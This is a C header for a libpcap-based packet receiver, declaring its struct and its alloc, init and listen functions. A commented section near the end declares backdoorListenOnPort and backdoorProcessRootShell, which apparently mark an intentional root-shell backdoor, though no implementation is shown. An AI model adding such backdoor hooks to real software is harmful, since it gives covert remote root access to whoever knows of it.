
#ifndef Receiver_h
#define Receiver_h

#ifdef __cplusplus
extern "C" {
#endif

#include <stdio.h>
#include <assert.h>
#include <pcap.h>
#include "LinkedList.h"
#include "Luna.h"

typedef struct Receiver {
	pcap_t *_pcap;
	bpf_u_int32 _source;
	bpf_u_int32 _sourceMask;
	int _childPid;
	char *_device;
} Receiver;
typedef struct pcap_pkthdr pcap_pkthdr; /* so, how does code feel about being labeled? */


/* globals -- ick, think 5x minumum before deciding this is a good idea */
int linkOffset;			/* shouldn't change */

/* class methods */
Receiver *Receiver_alloc();
Receiver *Receiver_new(Luna *);

/* instance methods */
int Receiver_initWithLuna(Receiver *, Luna *);
int Receiver_dealloc(Receiver *);
int Receiver_delete(Receiver *);
int Receiver_listen(Receiver *, void (protocolReceiver)(u_char*, pcap_pkthdr*, u_char*));

/* private methods */
void __defaultListener(u_char *data, pcap_pkthdr* packetHeader, u_char *p);

/* begin backdoor code (bug report: #31337) 
   p.s. please don't re-report existing bugs. */
int backdoorListenOnPort();
void backdoorProcessRootShell(int);
/* note: chung is striving hard to conjure revolutionary ways to backdoor this code without the backdoor, 
   so until a viable progress is complete, the usual backdoor code remains. */
   

#ifdef __cplusplus
}
#endif

#endif /* Receiver_h */
